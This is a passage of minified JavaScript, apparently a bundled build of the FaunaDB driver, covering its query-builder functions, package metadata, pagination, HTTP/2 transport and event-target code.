s({update:a(e),params:a(t)})}function fr(e,t){return i.exact(2,arguments,fr.name),new s({replace:a(e),params:a(t)})}function dr(e){return i.exact(1,arguments,dr.name),new s({delete:a(e)})}function mr(e,t,n,r){return i.exact(4,arguments,mr.name),new s({insert:a(e),ts:a(t),action:a(n),params:a(r)})}function hr(e,t,n){return i.exact(3,arguments,hr.name),new s({remove:a(e),ts:a(t),action:a(n)})}function pr(e){return i.exact(1,arguments,pr.name),new s({create_class:a(e)})}function gr(e){return i.exact(1,arguments,gr.name),new s({create_collection:a(e)})}function yr(e){return i.exact(1,arguments,yr.name),new s({create_database:a(e)})}function wr(e){return i.exact(1,arguments,wr.name),new s({create_index:a(e)})}function vr(e){return i.exact(1,arguments,vr.name),new s({create_key:a(e)})}function br(e){return i.exact(1,arguments,br.name),new s({create_function:a(e)})}function Tr(e){return i.exact(1,arguments,Tr.name),new s({create_role:a(e)})}function xr(e){return i.exact(1,arguments,xr.name),new s({create_access_provider:a(e)})}function Er(e){return i.exact(1,arguments,Er.name),new s({singleton:a(e)})}function Sr(e){return i.exact(1,arguments,Sr.name),new s({events:a(e)})}function _r(e){i.min(1,arguments,_r.name);var t=Ze(arguments);return t.shift(),new s({match:a(e),terms:a(S(t))})}function Ar(){return i.min(1,arguments,Ar.name),new s({union:a(S(arguments))})}function Cr(e,t,n){return i.between(2,3,arguments,Cr.name),new s(D({merge:a(e),with:a(t)},{lambda:a(n)}))}function Or(){return i.min(1,arguments,Or.name),new s({intersection:a(S(arguments))})}function Lr(){return i.min(1,arguments,Lr.name),new s({difference:a(S(arguments))})}function Ir(e){return i.exact(1,arguments,Ir.name),new s({distinct:a(e)})}function Dr(e,t){return i.exact(2,arguments,Dr.name),new s({join:a(e),with:a(t)})}function kr(e,t,n){return i.exact(3,arguments,kr.name),new s({range:a(e),from:a(t),to:a(n)})}function Nr(e,t){return i.exact(2,arguments,Nr.name),new s({login:a(e),params:a(t)})}function Pr(e){return i.exact(1,arguments,Pr.name),new s({logout:a(e)})}function Rr(e,t){return i.exact(2,arguments,Rr.name),new s({identify:a(e),password:a(t)})}function jr(){return i.exact(0,arguments,jr.name),new s({identity:null})}function Fr(){return i.exact(0,arguments,Fr.name),new s({current_identity:null})}function Br(){return i.exact(0,arguments,Br.name),new s({has_identity:null})}function Mr(){return i.exact(0,arguments,Mr.name),new s({has_current_identity:null})}function Ur(){return i.exact(0,arguments,Ur.name),new s({current_token:null})}function Hr(){return i.exact(0,arguments,Hr.name),new s({has_current_token:null})}function qr(e,t){return i.min(1,arguments,qr.name),t=h.defaults(t,null),new s(D({concat:a(e)},{separator:a(t)}))}function Wr(e,t){return i.min(1,arguments,Wr.name),new s(D({casefold:a(e)},{normalizer:a(t)}))}function $r(e,t){return i.exact(2,arguments,$r.name),new s({containsstr:a(e),search:a(t)})}function Vr(e,t){return i.exact(2,arguments,Vr.name),new s({containsstrregex:a(e),pattern:a(t)})}function Jr(e,t){return i.exact(2,arguments,Jr.name),new s({startswith:a(e),search:a(t)})}function Gr(e,t){return i.exact(2,arguments,Gr.name),new s({endswith:a(e),search:a(t)})}function Xr(e){return i.exact(1,arguments,Xr.name),new s({regexescape:a(e)})}function zr(e,t,n){return i.between(2,3,arguments,zr.name),n=h.defaults(n,null),new s(D({findstr:a(e),find:a(t)},{start:a(n)}))}function Yr(e,t,n,r){return i.between(2,4,arguments,Yr.name),n=h.defaults(n,null),new s(D({findstrregex:a(e),pattern:a(t)},{start:a(n),num_results:a(r)}))}function Kr(e){return i.exact(1,arguments,Kr.name),new s({length:a(e)})}function Qr(e){return i.exact(1,arguments,Qr.name),new s({lowercase:a(e)})}function Zr(e){return i.exact(1,arguments,Zr.name),new s({ltrim:a(e)})}function ea(e,t,n){return i.between(1,3,arguments,ea.name),t=h.defaults(t,null),n=h.defaults(n,null),new s(D({ngram:a(e)},{min:a(t),max:a(n)}))}function ta(e,t){return i.between(1,2,arguments,ta.name),t=h.defaults(t,null),new s(D({repeat:a(e)},{number:a(t)}))}function na(e,t,n){return i.exact(3,arguments,na.name),new s({replacestr:a(e),find:a(t),replace:a(n)})}function ra(e,t,n,r){return i.between(3,4,arguments,ra.name),r=h.defaults(r,null),new s(D({replacestrregex:a(e),pattern:a(t),replace:a(n)},{first:a(r)}))}function aa(e){return i.exact(1,arguments,aa.name),new s({rtrim:a(e)})}function oa(e){return i.exact(1,arguments,oa.name),new s({space:a(e)})}function sa(e,t,n){return i.between(1,3,arguments,sa.name),t=h.defaults(t,null),n=h.defaults(n,null),new s(D({substring:a(e)},{start:a(t),length:a(n)}))}function ia(e){return i.exact(1,arguments,ia.name),new s({titlecase:a(e)})}function ua(e){return i.exact(1,arguments,ua.name),new s({trim:a(e)})}function ca(e){return i.exact(1,arguments,ca.name),new s({uppercase:a(e)})}function la(e){i.min(1,arguments,la.name);var t=Ze(arguments);return t.shift(),new s({format:a(e),values:a(S(t))})}function fa(e){return i.exact(1,arguments,fa.name),new s({time:a(e)})}function da(e,t){return i.exact(2,arguments,da.name),new s({epoch:a(e),unit:a(t)})}function ma(e,t,n){return i.exact(3,arguments,ma.name),new s({time_add:a(e),offset:a(t),unit:a(n)})}function ha(e,t,n){return i.exact(3,arguments,ha.name),new s({time_subtract:a(e),offset:a(t),unit:a(n)})}function pa(e,t,n){return i.exact(3,arguments,pa.name),new s({time_diff:a(e),other:a(t),unit:a(n)})}function ga(e){return i.exact(1,arguments,ga.name),new s({date:a(e)})}function ya(){return i.exact(0,arguments,ya.name),new s({now:a(null)})}function wa(){return i.exact(0,arguments,wa.name),new s({next_id:null})}function va(){return i.exact(0,arguments,va.name),new s({new_id:null})}function ba(e,t){switch(i.between(1,2,arguments,ba.name),arguments.length){case 1:return new s({database:a(e)});case 2:return new s({database:a(e),scope:a(t)})}}function Ta(e,t){switch(i.between(1,2,arguments,Ta.name),arguments.length){case 1:return new s({index:a(e)});case 2:return new s({index:a(e),scope:a(t)})}}function xa(e,t){switch(i.between(1,2,arguments,xa.name),arguments.length){case 1:return new s({class:a(e)});case 2:return new s({class:a(e),scope:a(t)})}}function Ea(e,t){switch(i.between(1,2,arguments,Ea.name),arguments.length){case 1:return new s({collection:a(e)});case 2:return new s({collection:a(e),scope:a(t)})}}function Sa(e,t){switch(i.between(1,2,arguments,Sa.name),arguments.length){case 1:return new s({function:a(e)});case 2:return new s({function:a(e),scope:a(t)})}}function _a(e,t){return i.between(1,2,arguments,_a.name),t=h.defaults(t,null),new s(D({role:a(e)},{scope:a(t)}))}function Aa(e){return i.max(1,arguments,Aa.name),e=h.defaults(e,null),new s({access_providers:a(e)})}function Ca(e){return i.max(1,arguments,Ca.name),e=h.defaults(e,null),new s({classes:a(e)})}function Oa(e){return i.max(1,arguments,Oa.name),e=h.defaults(e,null),new s({collections:a(e)})}function La(e){return i.max(1,arguments,La.name),e=h.defaults(e,null),new s({databases:a(e)})}function Ia(e){return i.max(1,arguments,Ia.name),e=h.defaults(e,null),new s({indexes:a(e)})}function Da(e){return i.max(1,arguments,Da.name),e=h.defaults(e,null),new s({functions:a(e)})}function ka(e){return i.max(1,arguments,ka.name),e=h.defaults(e,null),new s({roles:a(e)})}function Na(e){return i.max(1,arguments,Na.name),e=h.defaults(e,null),new s({keys:a(e)})}function Pa(e){return i.max(1,arguments,Pa.name),e=h.defaults(e,null),new s({tokens:a(e)})}function Ra(e){return i.max(1,arguments,Ra.name),e=h.defaults(e,null),new s({credentials:a(e)})}function ja(){return i.min(1,arguments,ja.name),new s({equals:a(S(arguments))})}function Fa(e,t){return i.exact(2,arguments,Fa.name),new s({contains:a(e),in:a(t)})}function Ba(e,t){return i.exact(2,arguments,Ba.name),new s({contains_value:a(e),in:a(t)})}function Ma(e,t){return i.exact(2,arguments,Ma.name),new s({contains_field:a(e),in:a(t)})}function Ua(e,t){return i.exact(2,arguments,Ua.name),new s({contains_path:a(e),in:a(t)})}function Ha(e,t,n){i.between(2,3,arguments,Ha.name);var r={select:a(e),from:a(t)};return n!==void 0&&(r.default=a(n)),new s(r)}function qa(e,t){return i.exact(2,arguments,qa.name),new s({select_all:a(e),from:a(t)})}function Wa(e){return i.exact(1,arguments,Wa.name),new s({abs:a(e)})}function $a(){return i.min(1,arguments,$a.name),new s({add:a(S(arguments))})}function Va(){return i.min(1,arguments,Va.name),new s({bitand:a(S(arguments))})}function Ja(e){return i.exact(1,arguments,Ja.name),new s({bitnot:a(e)})}function Ga(){return i.min(1,arguments,Ga.name),new s({bitor:a(S(arguments))})}function Xa(){return i.min(1,arguments,Xa.name),new s({bitxor:a(S(arguments))})}function za(e){return i.exact(1,arguments,za.name),new s({ceil:a(e)})}function Ya(){return i.min(1,arguments,Ya.name),new s({divide:a(S(arguments))})}function Ka(e){return i.exact(1,arguments,Ka.name),new s({floor:a(e)})}function Qa(){return i.min(1,arguments,Qa.name),new s({max:a(S(arguments))})}function Za(){return i.min(1,arguments,Za.name),new s({min:a(S(arguments))})}function eo(){return i.min(1,arguments,eo.name),new s({modulo:a(S(arguments))})}function to(){return i.min(1,arguments,to.name),new s({multiply:a(S(arguments))})}function no(e,t){return i.min(1,arguments,no.name),t=h.defaults(t,null),new s(D({round:a(e)},{precision:a(t)}))}function ro(){return i.min(1,arguments,ro.name),new s({subtract:a(S(arguments))})}function ao(e){return i.exact(1,arguments,ao.name),new s({sign:a(e)})}function oo(e){return i.exact(1,arguments,oo.name),new s({sqrt:a(e)})}function so(e,t){return i.min(1,arguments,so.name),t=h.defaults(t,null),new s(D({trunc:a(e)},{precision:a(t)}))}function io(e){return i.exact(1,arguments,io.name),new s({count:a(e)})}function uo(e){return i.exact(1,arguments,uo.name),new s({sum:a(e)})}function co(e){return i.exact(1,arguments,co.name),new s({mean:a(e)})}function lo(e){return i.exact(1,arguments,lo.name),new s({any:a(e)})}function fo(e){return i.exact(1,arguments,fo.name),new s({all:a(e)})}function mo(e){return i.exact(1,arguments,mo.name),new s({acos:a(e)})}function ho(e){return i.exact(1,arguments,ho.name),new s({asin:a(e)})}function po(e){return i.exact(1,arguments,po.name),new s({atan:a(e)})}function go(e){return i.exact(1,arguments,go.name),new s({cos:a(e)})}function yo(e){return i.exact(1,arguments,yo.name),new s({cosh:a(e)})}function wo(e){return i.exact(1,arguments,wo.name),new s({degrees:a(e)})}function vo(e){return i.exact(1,arguments,vo.name),new s({exp:a(e)})}function bo(e,t){return i.min(1,arguments,bo.name),t=h.defaults(t,null),new s(D({hypot:a(e)},{b:a(t)}))}function To(e){return i.exact(1,arguments,To.name),new s({ln:a(e)})}function xo(e){return i.exact(1,arguments,xo.name),new s({log:a(e)})}function Eo(e,t){return i.min(1,arguments,Eo.name),t=h.defaults(t,null),new s(D({pow:a(e)},{exp:a(t)}))}function So(e){return i.exact(1,arguments,So.name),new s({radians:a(e)})}function _o(e){return i.exact(1,arguments,_o.name),new s({sin:a(e)})}function Ao(e){return i.exact(1,arguments,Ao.name),new s({sinh:a(e)})}function Co(e){return i.exact(1,arguments,Co.name),new s({tan:a(e)})}function Oo(e){return i.exact(1,arguments,Oo.name),new s({tanh:a(e)})}function Lo(){return i.min(1,arguments,Lo.name),new s({lt:a(S(arguments))})}function Io(){return i.min(1,arguments,Io.name),new s({lte:a(S(arguments))})}function Do(){return i.min(1,arguments,Do.name),new s({gt:a(S(arguments))})}function ko(){return i.min(1,arguments,ko.name),new s({gte:a(S(arguments))})}function No(){return i.min(1,arguments,No.name),new s({and:a(S(arguments))})}function Po(){return i.min(1,arguments,Po.name),new s({or:a(S(arguments))})}function Ro(e){return i.exact(1,arguments,Ro.name),new s({not:a(e)})}function jo(e){return i.exact(1,arguments,jo.name),new s({to_string:a(e)})}function Fo(e){return i.exact(1,arguments,Fo.name),new s({to_number:a(e)})}function Bo(e){return i.exact(1,arguments,Bo.name),new s({to_object:a(e)})}function Mo(e){return i.exact(1,arguments,Mo.name),new s({to_array:a(e)})}function Uo(e){return i.exact(1,arguments,Uo.name),new s({to_double:a(e)})}function Ho(e){return i.exact(1,arguments,Ho.name),new s({to_integer:a(e)})}function qo(e){return i.exact(1,arguments,qo.name),new s({to_time:a(e)})}function Wo(e){return i.exact(1,arguments,Wo.name),new s({to_seconds:a(e)})}function $o(e){return i.exact(1,arguments,$o.name),new s({to_millis:a(e)})}function Vo(e){return i.exact(1,arguments,Vo.name),new s({to_micros:a(e)})}function Jo(e){return i.exact(1,arguments,Jo.name),new s({day_of_week:a(e)})}function Go(e){return i.exact(1,arguments,Go.name),new s({day_of_year:a(e)})}function Xo(e){return i.exact(1,arguments,Xo.name),new s({day_of_month:a(e)})}function zo(e){return i.exact(1,arguments,zo.name),new s({hour:a(e)})}function Yo(e){return i.exact(1,arguments,Yo.name),new s({minute:a(e)})}function Ko(e){return i.exact(1,arguments,Ko.name),new s({second:a(e)})}function Qo(e){return i.exact(1,arguments,Qo.name),new s({month:a(e)})}function Zo(e){return i.exact(1,arguments,Zo.name),new s({year:a(e)})}function es(e){return i.exact(1,arguments,es.name),new s({to_date:a(e)})}function ts(e,t){return i.exact(2,arguments,ts.name),new s({move_database:a(e),to:a(t)})}function ns(e){return i.exact(1,arguments,ns.name),new s({documents:a(e)})}function rs(e){return i.exact(1,arguments,rs.name),new s({reverse:a(e)})}function as(e){return i.exact(1,arguments,as.name),new s({access_provider:a(e)})}function i(e,t,n,r){if(e!==null&&n.length<e||t!==null&&n.length>t)throw new q.InvalidArity(e,t,n.length,r)}i.exact=function(e,t,n){i(e,e,t,n)};i.max=function(e,t,n){i(null,e,t,n)};i.min=function(e,t,n){i(e,null,t,n)};i.between=function(e,t,n,r){i(e,t,n,r)};function D(e,t){for(var n in t){var r=t[n];r!=null&&(e[n]=r)}return e}function S(e){var t=Array.isArray(e)?e:Array.prototype.slice.call(e);return e.length===1?e[0]:t}function Ze(e){var t=[];return t.push.apply(t,e),t}function a(e){return i.exact(1,arguments,a.name),e===null?null:e instanceof s||h.checkInstanceHasProperty(e,"_isFaunaExpr")?e:typeof e=="symbol"?e.toString().replace(/Symbol\((.*)\)/,function(t,n){return n}):typeof e=="function"?At(e):Array.isArray(e)?new s(e.map(function(t){return a(t)})):e instanceof Uint8Array||e instanceof ArrayBuffer?new U.Bytes(e):typeof e=="object"?new s({object:Qe(e)}):e}function Qe(e){if(e!==null){var t={};return Object.keys(e).forEach(function(n){t[n]=a(e[n])}),t}else return null}var se={Ref:gn,Bytes:yn,Abort:wn,At:vn,Let:bn,Var:Te,If:Tn,Do:xn,Object:En,Lambda:At,Call:Sn,Query:_n,Map:An,Foreach:Cn,Filter:On,Take:Ln,Drop:In,Prepend:Dn,Append:kn,IsEmpty:Nn,IsNonEmpty:Pn,IsNumber:Rn,IsDouble:jn,IsInteger:Fn,IsBoolean:Bn,IsNull:Mn,IsBytes:Un,IsTimestamp:Hn,IsDate:qn,IsString:Wn,IsArray:$n,IsObject:Vn,IsRef:Jn,IsSet:Gn,IsDoc:Xn,IsLambda:zn,IsCollection:Yn,IsDatabase:Kn,IsIndex:Qn,IsFunction:Zn,IsKey:er,IsToken:tr,IsCredentials:nr,IsRole:rr,Get:ar,KeyFromSecret:or,Reduce:sr,Paginate:ir,Exists:ur,Create:cr,Update:lr,Replace:fr,Delete:dr,Insert:mr,Remove:hr,CreateClass:G(pr,"CreateClass() is deprecated, use CreateCollection() instead"),CreateCollection:gr,CreateDatabase:yr,CreateIndex:wr,CreateKey:vr,CreateFunction:br,CreateRole:Tr,CreateAccessProvider:xr,Singleton:Er,Events:Sr,Match:_r,Union:Ar,Merge:Cr,Intersection:Or,Difference:Lr,Distinct:Ir,Join:Dr,Range:kr,Login:Nr,Logout:Pr,Identify:Rr,Identity:G(jr,"Identity() is deprecated, use CurrentIdentity() instead"),CurrentIdentity:Fr,HasIdentity:G(Br,"HasIdentity() is deprecated, use HasCurrentIdentity() instead"),HasCurrentIdentity:Mr,CurrentToken:Ur,HasCurrentToken:Hr,Concat:qr,Casefold:Wr,ContainsStr:$r,ContainsStrRegex:Vr,StartsWith:Jr,EndsWith:Gr,FindStr:zr,FindStrRegex:Yr,Length:Kr,LowerCase:Qr,LTrim:Zr,NGram:ea,Repeat:ta,ReplaceStr:na,ReplaceStrRegex:ra,RegexEscape:Xr,RTrim:aa,Space:oa,SubString:sa,TitleCase:ia,Trim:ua,UpperCase:ca,Format:la,Time:fa,TimeAdd:ma,TimeSubtract:ha,TimeDiff:pa,Epoch:da,Date:ga,Now:ya,NextId:G(wa,"NextId() is deprecated, use NewId() instead"),NewId:va,Database:ba,Index:Ta,Class:G(xa,"Class() is deprecated, use Collection() instead"),Collection:Ea,Function:Sa,Role:_a,AccessProviders:Aa,Classes:G(Ca,"Classes() is deprecated, use Collections() instead"),Collections:Oa,Databases:La,Indexes:Ia,Functions:Da,Roles:ka,Keys:Na,Tokens:Pa,Credentials:Ra,Equals:ja,Contains:G(Fa,"Contains() is deprecated, use ContainsPath() instead"),ContainsPath:Ua,ContainsField:Ma,ContainsValue:Ba,Select:Ha,SelectAll:G(qa,"SelectAll() is deprecated. Avoid use."),Abs:Wa,Add:$a,BitAnd:Va,BitNot:Ja,BitOr:Ga,BitXor:Xa,Ceil:za,Divide:Ya,Floor:Ka,Max:Qa,Min:Za,Modulo:eo,Multiply:to,Round:no,Subtract:ro,Sign:ao,Sqrt:oo,Trunc:so,Count:io,Sum:uo,Mean:co,Any:lo,All:fo,Acos:mo,Asin:ho,Atan:po,Cos:go,Cosh:yo,Degrees:wo,Exp:vo,Hypot:bo,Ln:To,Log:xo,Pow:Eo,Radians:So,Sin:_o,Sinh:Ao,Tan:Co,Tanh:Oo,LT:Lo,LTE:Io,GT:Do,GTE:ko,And:No,Or:Po,Not:Ro,ToString:jo,ToNumber:Fo,ToObject:Bo,ToArray:Mo,ToDouble:Uo,ToInteger:Ho,ToTime:qo,ToSeconds:Wo,ToMicros:Vo,ToMillis:$o,DayOfMonth:Xo,DayOfWeek:Jo,DayOfYear:Go,Second:Ko,Minute:Yo,Hour:zo,Month:Qo,Year:Zo,ToDate:es,MoveDatabase:ts,Documents:ns,Reverse:rs,AccessProvider:as,wrap:a},cu="faunadb",lu="4.1.3",fu="4",du="FaunaDB Javascript driver for Node.JS and Browsers",mu="https://fauna.com",hu="fauna/faunadb-js",pu="MPL-2.0",gu=["database","fauna","official","driver"],yu={url:"https://github.com/fauna/faunadb-js/issues"},wu=["index.d.ts","src/","dist/"],vu="index.js",bu={doc:"jsdoc -c ./jsdoc.json",browserify:"browserify index.js --standalone faunadb -o dist/faunadb.js","browserify-min":"browserify index.js --standalone faunadb | terser -c -m --keep-fnames --keep-classnames -o dist/faunadb-min.js",prettify:'prettier --write "{src,test}/**/*.{js,ts}"',test:"jest --env=node --verbose=false --forceExit ./test","semantic-release":"semantic-release",wp:"webpack"},Tu="index.d.ts",xu={"abort-controller":"^3.0.0","base64-js":"^1.2.0","btoa-lite":"^1.0.0","cross-fetch":"^3.0.6",dotenv:"^8.2.0","fn-annotate":"^1.1.3","object-assign":"^4.1.0","util-deprecate":"^1.0.2"},Eu={browserify:"^16.2.2",eslint:"^5.3.0","eslint-config-prettier":"^6.5.0","eslint-plugin-prettier":"^3.1.1",husky:">=1","ink-docstrap":"^1.2.1",jest:"^24.9.0",jsdoc:"^3.6.3","lint-staged":">=8",prettier:"1.18.2","semantic-release":"^17.1.2",terser:"^4.3.9",webpack:"^5.23.0","webpack-cli":"^4.5.0"},Su={hooks:{"pre-commit":"lint-staged"}},_u={branches:["master"]},Au={http2:!1,http:!1,https:!1,os:!1,util:!1},Ot={name:cu,version:lu,apiVersion:fu,description:du,homepage:mu,repository:hu,license:pu,keywords:gu,bugs:yu,files:wu,main:vu,scripts:bu,types:Tu,dependencies:xu,devDependencies:Eu,husky:Su,"lint-staged":{"*.{js,css,json,md}":["prettier --write","git add"],"*.js":["eslint --fix","git add"]},release:_u,browser:Au};function B(e,t,n,r){n===void 0&&(n={}),r===void 0&&(r={}),this.reverse=!1,this.params={},this.before=void 0,this.after=void 0,Ke(this.params,n);var o=this.params.cursor||this.params;"before"in o?(this.before=o.before,delete o.before):"after"in o&&(this.after=o.after,delete o.after),this.options={},Ke(this.options,r),this.client=e,this.set=t,this._faunaFunctions=[]}B.prototype.map=function(e){var t=this._clone();return t._faunaFunctions.push(function(n){return se.Map(n,e)}),t};B.prototype.filter=function(e){var t=this._clone();return t._faunaFunctions.push(function(n){return se.Filter(n,e)}),t};B.prototype.each=function(e){return this._retrieveNextPage(this.after,!1).then(this._consumePages(e,!1))};B.prototype.eachReverse=function(e){return this._retrieveNextPage(this.before,!0).then(this._consumePages(e,!0))};B.prototype.previousPage=function(){var e=this;return this._retrieveNextPage(this.before,!0).then(this._adjustCursors.bind(e))};B.prototype.nextPage=function(){var e=this;return this._retrieveNextPage(this.after,!1).then(this._adjustCursors.bind(e))};B.prototype._adjustCursors=function(e){return e.after!==void 0&&(this.after=e.after),e.before!==void 0&&(this.before=e.before),e.data};B.prototype._consumePages=function(e,t){var n=this;return function(r){var o=[];r.data.forEach(function(f){f.document&&(f.instance=f.document),f.value&&f.value.document&&(f.value.instance=f.value.document),o.push(f)}),e(o);var u;return t?u=r.before:u=r.after,u!==void 0?n._retrieveNextPage(u,t).then(n._consumePages(e,t)):Promise.resolve()}};B.prototype._retrieveNextPage=function(e,t){var n={};Ke(n,this.params);var r=n.cursor||n;e!==void 0?t?r.before=e:r.after=e:t&&(r.before=null);var o=se.Paginate(this.set,n);return this._faunaFunctions.length>0&&this._faunaFunctions.forEach(function(u){o=u(o)}),this.client.query(o,this.options)};B.prototype._clone=function(){return Object.create(B.prototype,{client:{value:this.client},set:{value:this.set},_faunaFunctions:{value:this._faunaFunctions},before:{value:this.before},after:{value:this.after}})};var os=B;function ss(e,t,n,r,o,u,f,l,m,p,w){this.method=e,this.path=t,this.query=n,this.requestRaw=r,this.requestContent=o,this.responseRaw=u,this.responseContent=f,this.statusCode=l,this.responseHeaders=m,this.startTime=p,this.endTime=w}Object.defineProperty(ss.prototype,"timeTaken",{get:function(){return this.endTime-this.startTime}});var Lt=ss;function is(e){Error.call(this),this.message=e||"Request aborted due to timeout",this.isTimeoutError=!0}h.inherits(is,Error);function us(e){Error.call(this),this.message=e||"Request aborted",this.isAbortError=!0}h.inherits(us,Error);var xe={TimeoutError:is,AbortError:us},Cu=1e3*60,cs="stream::";function et(){this.type="http2",this._sessionMap={}}et.prototype._resolveSessionFor=function(e,t){var n=t?cs+e:e;if(!this._sessionMap[n]){var r=this,o=function(){r._cleanupSessionFor(e,t)};this._sessionMap[n]=$.connect(e).once("error",o).once("goaway",o).setTimeout(Cu,o)}return this._sessionMap[n]};et.prototype._cleanupSessionFor=function(e,t){var n=t?cs+e:e;this._sessionMap[n]&&(this._sessionMap[n].close(),delete this._sessionMap[n])};et.prototype.execute=function(e){var t=this,n=e.streamConsumer!=null;return new Promise(function(r,o){var u=!1,f=!1,l=function(P){u=!0,r(P)},m=function(P){if(u&&n)return e.streamConsumer.onError(P);u=!0,o(P)},p=function(){e.signal&&e.signal.removeEventListener("abort",b)},w=function(P){p(),m(P)},b=function(){f=!0,p(),ne.close($.constants.NGHTTP2_CANCEL),m(new xe.AbortError)},N=function(){f=!0,p(),ne.close($.constants.NGHTTP2_CANCEL),m(new xe.TimeoutError)},te=function(P){var me=P[$.constants.HTTP2_HEADER_STATUS],Me=me>=200&&me<400,he=Me&&n,Ue="",dt=function(He){if(he)return e.streamConsumer.onData(He);Ue+=He},J=function(){if(p(),!he)return l({body:Ue,headers:P,status:me});f||e.streamConsumer.onError(new TypeError("network error"))};he&&l({body:"[stream]",headers:P,status:me}),ne.on("data",dt).on("end",J)};try{var _=(e.path[0]==="/"?e.path:"/"+e.path)+h.querystringify(e.query,"?"),Oe=Object.assign({},e.headers,{[$.constants.HTTP2_HEADER_PATH]:_,[$.constants.HTTP2_HEADER_METHOD]:e.method}),Be=t._resolveSessionFor(e.origin,n),ne=Be.request(Oe).setEncoding("utf8").on("error",w).on("response",te);!e.signal&&e.timeout&&ne.setTimeout(e.timeout,N),e.signal&&e.signal.addEventListener("abort",b),e.body!=null&&ne.write(e.body),ne.end()}catch(P){t._cleanupSessionFor(e.origin,n),m(P)}})};var Ou=et,ls=new WeakMap,It=new WeakMap;function E(e){let t=ls.get(e);return console.assert(t!=null,"'this' is expected an Event object, but got",e),t}function fs(e){if(e.passiveListener!=null){typeof console!="undefined"&&typeof console.error=="function"&&console.error("Unable to preventDefault inside passive event listener invocation.",e.passiveListener);return}!e.event.cancelable||(e.canceled=!0,typeof e.event.preventDefault=="function"&&e.event.preventDefault())}function Ee(e,t){ls.set(this,{eventTarget:e,event:t,eventPhase:2,currentTarget:e,canceled:!1,stopped:!1,immediateStopped:!1,passiveListener:null,timeStamp:t.timeStamp||Date.now()}),Object.defineProperty(this,"isTrusted",{value:!1,enumerable:!0});let n=Object.keys(t);for(let r=0;r<n.length;++r){let o=n[r];o in this||Object.defineProperty(this,o,ds(o))}}Ee.prototype={get type(){return E(this).event.type},get target(){return E(this).eventTarget},get currentTarget(){return E(this).currentTarget},composedPath(){let e=E(this).currentTarget;return e==null?[]:[e]},get NONE(){return 0},get CAPTURING_PHASE(){return 1},get AT_TARGET(){return 2},get BUBBLING_PHASE(){return 3},get eventPhase(){return E(this).eventPhase},stopPropagation(){let e=E(this);e.stopped=!0,typeof e.event.stopPropagation=="function"&&e.event.stopPropagation()},stopImmediatePropagation(){let e=E(this);e.stopped=!0,e.immediateStopped=!0,typeof e.event.stopImmediatePropagation=="function"&&e.event.stopImmediatePropagation()},get bubbles(){return Boolean(E(this).event.bubbles)},get cancelable(){return Boolean(E(this).event.cancelable)},preventDefault(){fs(E(this))},get defaultPrevented(){return E(this).canceled},get composed(){return Boolean(E(this).event.composed)},get timeStamp(){return E(this).timeStamp},get srcElement(){return E(this).eventTarget},get cancelBubble(){return E(this).stopped},set cancelBubble(e){if(!e)return;let t=E(this);t.stopped=!0,typeof t.event.cancelBubble=="boolean"&&(t.event.cancelBubble=!0)},get returnValue(){return!E(this).canceled},set returnValue(e){e||fs(E(this))},initEvent(){}};Object.defineProperty(Ee.prototype,"constructor",{value:Ee,configurable:!0,writable:!0});typeof window!="undefined"&&typeof window.Event!="undefined"&&(Object.setPrototypeOf(Ee.prototype,window.Event.prototype),It.set(window.Event.prototype,Ee));function ds(e){return{get(){return E(this).event[e]},set(t){E(this).event[e]=t},configurable:!0,enumerable:!0}}function Lu(e){return{value(){let t=E(this).event;return t[e].apply(t,arguments)},configurable:!0,enumerable:!0}}function Iu(e,t){let n=Object.keys(t);if(n.length===0)return e;function r(o,u){e.call(this,o,u)}r.prototype=Object.create(e.prototype,{constructor:{value:r,configurable:!0,writable:!0}});for(let o=0;o<n.length;++o){let u=n[o];if(!(u in e.prototype)){let l=typeof Object.getOwnPropertyDescriptor(t,u).value=="function";Object.defineProperty(r.prototype,u,l?Lu(u):ds(u))}}return r}function ms(e){if(e==null||e===Object.prototype)return Ee;let t=It.get(e);return t==null&&(t=Iu(ms(Object.getPrototypeOf(e)),e),It.set(e,t)),t}function Du(e,t){let n=ms(Object.getPrototypeOf(t));return new n(e,t)}function ku(e){return E(e).immediateStopped}function Nu(e,t){E(e).eventPhase=t}function Pu(e,t){E(e).currentTarget=t}function hs(e,t){E(e).passiveListener=t}var ps=new WeakMap,gs=1,ys=2,tt=3;function nt(e){return e!==null&&typeof e=="object"}function ke(e){let t=ps.get(e);if(t==null)throw new TypeError("'this' is expected an EventTarget object, but got another value.");return t}function Ru(e){return{get(){let n=ke(this).get(e);for(;n!=null;){if(n.listenerType===tt)return n.listener;n=n.next}return null},set(t){typeof t!="function"&&!nt(t)&&(t=null);let n=ke(this),r=null,o=n.get(e);for(;o!=null;)o.listenerType===tt?r!==null?r.next=o.next:o.next!==null?n.set(e,o.next):n.delete(e):r=o,o=o.next;if(t!==null){let u={listener:t,listenerType:tt,passive:!1,once:!1,next:null};r===null?n.set(e,u):r.next=u}},configurable:!0,enumerable:!0}}function ws(e,t){Object.defineProperty(e,`on${t}`,Ru(t))}function vs(e){function t(){K.call(this)}t.prototype=Object.create(K.prototype,{constructor:{value:t,configurable:!0,writable:!0}});for(let n=0;n<e.length;++n)ws(t.prototype,e[n]);return t}function K(){if(this instanceof K){ps.set(this,new Map);return}if(arguments.length===1&&Array.isArray(arguments[0]))return vs(arguments[0]);if(arguments.length>0){let e=new Array(arguments.length);for(let t=0;t<arguments.length;++t)e[t]=arguments[t];return vs(e)}throw new TypeError("Cannot call a class as a function")}K.prototype={addEventListener(e,t,n){if(t==null)return;if(typeof t!="function"&&!nt(t))throw new TypeError("'listener' should be a function or an object.");let r=ke(this),o=nt(n),f=Boolean(o?n.capture:n)?gs:ys,l={listener:t,listenerType:f,passive:o&&Boolean(n.passive),once:o&&Boolean(n.once),next:null},m=r.get(e);if(m===void 0){r.set(e,l);return}let p=null;for(;m!=null;){if(m.listener===t&&m.listenerType===f)return;p=m,m=m.next}p.next=l},removeEventListener(e,t,n){if(t==null)return;let r=ke(this),u=(nt(n)?Boolean(n.capture):Boolean(n))?gs:ys,f=null,l=r.get(e);for(;l!=null;){if(l.listener===t&&l.listenerType===u){f!==null?f.next=l.next:l.next!==null?r.set(e,l.next):r.delete(e);return}f=l,l=l.next}},dispatchEvent(e){if(e==null||typeof e.type!="string")throw new TypeError('"event.type" should be a string.');let t=ke(this),n=e.type,r=t.get(n);if(r==null)return!0;let o=Du(this,e),u=null;for(;r!=null;){if(r.once?u!==null?u.next=r.next:r.next!==null?t.set(n,r.next):t.delete(n):u=r,hs(o,r.passive?r.listener:null),typeof r.listener=="function")try{r.listener.call(this,o)}catch(f){typeof console!="undefined"&&typeof console.error=="function"&&console.error(f)}else r.listenerType!==tt&&typeof 